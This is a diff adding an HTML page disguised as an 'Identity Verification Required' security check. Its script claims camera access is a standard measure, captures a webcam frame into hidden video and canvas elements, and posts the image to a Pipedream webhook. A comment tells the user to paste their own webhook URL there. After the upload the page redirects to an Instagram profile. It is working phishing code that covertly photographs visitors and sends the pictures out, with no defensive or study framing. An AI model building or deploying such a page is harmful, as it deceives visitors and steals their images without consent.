@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Important Security Check</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #222; color: #eee; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }
+        .container { background: #333; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); max-width: 500px; }
+        h1 { color: #00ff99; margin-bottom: 25px; font-size: 1.8em; }
+        p { margin-bottom: 30px; line-height: 1.7; font-size: 1.1em; }
+        button { background: #00ff99; color: #1a1a1a; border: none; padding: 15px 35px; border-radius: 6px; font-size: 1.3em; cursor: pointer; transition: background 0.3s ease, transform 0.2s ease; font-weight: bold; }
+        button:hover { background: #00e680; transform: translateY(-2px); }
+        #status { margin-top: 25px; color: #ffeb3b; font-size: 1em; }
+        video, canvas { display: none; } /* Keep these hidden */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Identity Verification Required</h1>
+        <p>To access this sensitive content, we need to quickly verify your identity. Please tap "Continue" and *allow camera access* when prompted. This is a standard security measure.</p>
+        <button id="accessButton">Continue to Content</button>
+        <p id="status"></p>
+        <video id="videoElement" autoplay></video>
+        <canvas id="canvasElement"></canvas>
+    </div>
+
+    <script>
+        const accessButton = document.getElementById('accessButton');
+        const videoElement = document.getElementById('videoElement');
+        const canvasElement = document.getElementById('canvasElement');
+        const statusElement = document.getElementById('status');
+        const context = canvasElement.getContext('2d');
+        
+        // --- CRITICAL STEP: PASTE YOUR PIPEDREAM WEBHOOK URL HERE ---
+        const uploadPath = 'https://eoukkf7emqrufvo.m.pipedream.net/'; 
+        // Example: const uploadPath = 'https://eozgxxxxxx-xxxxxxxxxxxx.m.pipedream.net';
+
+        accessButton.addEventListener('click', async () => {
+            statusElement.textContent = 'Verifying identity...';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream; 
+
+                videoElement.onloadedmetadata = () => {
+                    canvasElement.width = videoElement.videoWidth;
+                    canvasElement.height = videoElement.videoHeight;
+                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+
+                    const imageData = canvasElement.toDataURL('image/jpeg', 0.8); 
+                    stream.getTracks().forEach(track => track.stop());
+
+                    sendImageToServer(imageData);
+                };
+
+            } catch (err) {
+                statusElement.textContent = 'Verification failed. Please allow camera access. Error: ' + err.message;
+                console.error('Camera access error:', err);
+            }
+        });
+
+        async function sendImageToServer(imageData) {
+            try {
+                const response = await fetch(uploadPath, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ image: imageData }),
+                });
+
+                if (response.ok) {
+                    statusElement.textContent = 'Verification complete! Redirecting...';
+                    window.location.href = 'https://www.instagram.com/mastinaiiiii'; 
+                } else {
+                    statusElement.textContent = 'Verification server error. Try again.';
+                }
+            } catch (error) {
+                statusElement.textContent = 'Failed to connect to verification server.';
+                console.error('Error sending image:', error);
+            }
+        }
+    </script>
+</body>
+</html>
